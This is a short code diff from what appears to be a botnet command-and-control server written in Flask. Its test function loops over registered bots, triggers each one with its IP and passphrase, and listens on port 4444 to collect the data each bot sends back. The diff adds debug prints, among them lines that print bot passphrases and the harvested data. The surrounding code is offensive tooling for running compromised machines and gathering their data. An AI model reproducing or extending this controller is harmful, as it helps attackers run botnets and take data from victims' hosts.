@@ -32,13 +32,20 @@ def test():
     for bot in bot_names:
         bot_ip = bot_dict[bot][0]
         bot_passphrase = bot_dict[bot][1]
+        print(bot_ip)
+        print(bot_passphrase)
         try:
             trigger(bot_ip, bot_passphrase)
+            print("[*] Bot has been triggered")
             data = listner(system_ip, 4444)
+            print("Data fetched from the bot: ")
+            print(data)
         except:
             data = json.dumps([bot + ' failed to fetch data'])
             pass
         data_package.append(json.loads(data))
+        print("Total data recieved: ")
+        print(data_package)
     return data_package
 
 @app.route('/bot_register')
